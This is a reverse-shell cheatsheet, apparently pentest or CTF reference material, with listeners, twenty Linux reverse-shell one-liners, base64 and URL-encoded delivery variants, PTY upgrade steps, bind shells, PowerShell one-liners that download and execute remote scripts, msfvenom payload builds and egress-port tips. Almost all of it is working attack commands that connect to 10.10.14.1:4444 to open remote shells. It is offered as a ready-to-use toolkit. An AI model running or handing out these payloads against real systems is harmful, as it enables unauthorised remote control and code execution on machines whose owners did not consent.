---
title: "Reverse Shell Cheatsheet - 20 Languages, Listeners, PTY Upgrade"
category: misc
subcategory: post-exploitation
type: cheatsheet
tags: [reverse-shell, bind-shell, netcat, socat, powershell, pty-upgrade, base64, url-encode, listener, msfvenom, post-exploitation, windows, bash]
summary: "Reverse shells in 20 languages/binaries, listeners, the PTY upgrade sequence, base64/URL-encoded variants, and Windows/PowerShell payloads."
related: [net-reverse-shells, net-pivoting-cheatsheet, ad-windows-privesc]
---

Set `LHOST`/`LPORT` before using. Examples use `10.10.14.1` and `4444`.

## Listeners

```bash
# Plain netcat
nc -lvnp 4444
# netcat with readline (arrows/history)
rlwrap nc -lvnp 4444
# socat with a PTY (better shell immediately)
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
# pwncat-cs (auto-stabilise, upload/download)
pwncat-cs -lp 4444
# metasploit handler
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
# ncat with SSL
ncat --ssl -lvnp 4444
```

## Linux shells (20 variants)

```bash
# 1. bash /dev/tcp
bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'
# 2. bash read-line loop (no /dev/tcp echo)
bash -c '0<&196;exec 196<>/dev/tcp/10.10.14.1/4444; sh <&196 >&196 2>&196'
# 3. sh
sh -i >& /dev/tcp/10.10.14.1/4444 0>&1
# 4. mkfifo
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f
# 5. nc -e
nc -e /bin/sh 10.10.14.1 4444
# 6. nc without -e (openbsd)
rm -f /tmp/p;mknod /tmp/p p;nc 10.10.14.1 4444 0</tmp/p|sh 1>/tmp/p
# 7. ncat
ncat 10.10.14.1 4444 -e /bin/bash
# 8. python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.1",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
# 9. python (pty-backed)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.1",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
# 10. perl
perl -e 'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# 11. php exec
php -r '$s=fsockopen("10.10.14.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
# 12. php system
php -r '$s=fsockopen("10.10.14.1",4444);system("/bin/sh -i <&3 >&3 2>&3");'
# 13. ruby
ruby -rsocket -e 'c=TCPSocket.new("10.10.14.1",4444);$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec"/bin/sh -i"'
# 14. socat (full pty)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:10.10.14.1:4444
# 15. lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.14.1',4444);os.execute('/bin/sh -i <&3 >&3 2>&3');"
# 16. node.js
node -e 'require("child_process").exec("bash -c \"bash -i >& /dev/tcp/10.10.14.1/4444 0>&1\"")'
# 17. golang
echo 'package main;import("net";"os/exec";"os");func main(){c,_:=net.Dial("tcp","10.10.14.1:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/r.go && go run /tmp/r.go
# 18. awk
awk 'BEGIN{s="/inet/tcp/0/10.10.14.1/4444";while(1){do{printf "> "|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")}}' /dev/null
# 19. telnet double-pipe
rm -f /tmp/p;mknod /tmp/p p;telnet 10.10.14.1 4444 0</tmp/p|/bin/sh 1>/tmp/p
# 20. busybox
busybox nc 10.10.14.1 4444 -e /bin/sh
```

## Base64 / URL-encoded delivery

```bash
# base64-wrap a bash payload (survives shell metachar mangling)
echo -n 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' | base64
# run it on target:
echo BASE64 | base64 -d | bash
# base64 the whole invocation for a command param
echo -n 'bash -c "{echo,BASE64}|{base64,-d}|bash"'
# URL-encode a payload for a web parameter
python3 -c 'import urllib.parse;print(urllib.parse.quote("bash -c \"bash -i >& /dev/tcp/10.10.14.1/4444 0>&1\""))'
```

## PTY upgrade

```bash
# 1. spawn a pty on the target
python3 -c 'import pty;pty.spawn("/bin/bash")'
# alt spawns:
script -qc /bin/bash /dev/null
perl -e 'exec "/bin/bash";'
# 2. background: Ctrl-Z
# 3. on YOUR box: disable echo, foreground
stty raw -echo; fg
# 4. fix environment inside the shell
export TERM=xterm-256color; export SHELL=/bin/bash
# 5. set terminal size (get yours with `stty size`)
stty rows 50 cols 200
# recover a jammed terminal
reset
```

## Bind shells (when reverse is blocked)

```bash
# target listens
nc -lvnp 4444 -e /bin/sh
# connect in
nc -nv TARGET 4444
# socat bind with pty
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sane
# python bind
python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4444));s.listen(1);c,_=s.accept();[os.dup2(c.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

## Windows / PowerShell

```powershell
# PowerShell TCP client one-liner
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
# nc.exe
nc.exe 10.10.14.1 4444 -e cmd.exe
# powercat
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1/powercat.ps1');powercat -c 10.10.14.1 -p 4444 -e cmd"
# conpty (better interactive Windows shell)
powershell -c "IEX(IWR http://10.10.14.1/Invoke-ConPtyShell.ps1 -UseBasicParsing);Invoke-ConPtyShell 10.10.14.1 4444"
```

```bash
# Build base64 UTF-16LE for powershell -enc
echo -n 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.1/s.ps1")' | iconv -t UTF-16LE | base64 -w0
# deliver:  powershell -nop -enc <output>
```

## msfvenom payloads

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf -o s.elf
# Windows exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o s.exe
# Windows meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o m.exe
# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f war -o s.war
# PHP
msfvenom -p php/reverse_php LHOST=10.10.14.1 LPORT=4444 -f raw -o s.php
# MSI (AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f msi -o e.msi
# Python
msfvenom -p python/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -o s.py
```

## Egress notes

```bash
# Prefer commonly-allowed ports if 4444 is blocked
bash -c 'bash -i >& /dev/tcp/10.10.14.1/443 0>&1'
bash -c 'bash -i >& /dev/tcp/10.10.14.1/53 0>&1'
```
